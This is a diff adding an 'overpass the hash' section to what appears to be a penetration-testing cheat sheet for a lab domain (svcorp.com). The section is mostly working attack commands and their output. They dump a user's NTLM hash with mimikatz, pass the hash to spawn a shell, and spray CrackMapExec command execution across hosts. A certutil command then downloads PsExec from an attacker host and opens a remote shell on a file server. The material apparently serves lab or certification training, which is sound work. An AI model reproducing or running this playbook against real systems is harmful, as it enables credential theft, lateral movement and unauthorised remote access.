@@ -1751,15 +1751,95 @@ psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded94
 #### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
 With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
 ````
+In this technique we have to first get system access and follow the adding a user with high privs guides!
+Once the that guide in our cheat sheet is done come back to this. We are going from .24 to .21 in this guide
+````
+````
 privilege::debug
 sekurlsa::logonpasswords
 ````
 ````
-sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
+Authentication Id : 0 ; 1822926 (00000000:001bd0ce)
+Session           : NewCredentials from 0
+User Name         : SYSTEM
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/04/2023 23:45:17
+SID               : S-1-5-18
+        msv :
+         [00000003] Primary
+         * Username : pete
+         * Domain   : svcorp.com
+         * NTLM     : 0f951bc4fdc5dfcd148161420b9c6207
+        tspkg :
+        wdigest :
+         * Username : pete
+         * Domain   : svcorp.com
+         * Password : (null)
+        kerberos :
+         * Username : pete
+         * Domain   : svcorp.com
+         * Password : (null)
+        ssp :
+        credman :
 ````
 ````
-exit
-klist
+sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /run:PowerShell.exe
+#this should spawn a new shell
+````
+````
+crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
+````
+````
+crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
+SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:svcorp.com) (signing:False) (SMBv1:True)
+SMB         10.11.1.24      445    SVCLIENT73       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT73) (domain:svcorp.com) (signing:False) (SMBv1:True)
+SMB         10.11.1.22      445    SVCLIENT08       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT08) (domain:svcorp.com) (signing:False) (SMBv1:True)
+SMB         10.11.1.20      445    SV-DC01          [*] Windows 10.0 Build 17763 x64 (name:SV-DC01) (domain:svcorp.com) (signing:True) (SMBv1:False)
+SMB         10.11.1.21      445    SV-FILE01        [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 (Pwn3d!)
+SMB         10.11.1.24      445    SVCLIENT73       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
+SMB         10.11.1.22      445    SVCLIENT08       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
+SMB         10.11.1.21      445    SV-FILE01        [+] Executed command 
+SMB         10.11.1.21      445    SV-FILE01        svcorp\pete
+SMB         10.11.1.20      445    SV-DC01          [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207
+````
+````
+````
+PS> klist # should show no TGT/TGS
+PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by authN to network share on the computer
+PS> klist # now should show TGT/TGS
+PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
+PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
+````
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.11.1.21
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.11.0.1
+
+Tunnel adapter isatap.{EA29B022-A71B-48E3-9746-0A3B38A4777C}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+C:\Windows\system32>whoami
+svcorp\pete
+
+C:\Windows\system32>
 ````
 ````
 net group "domain controllers" /domain
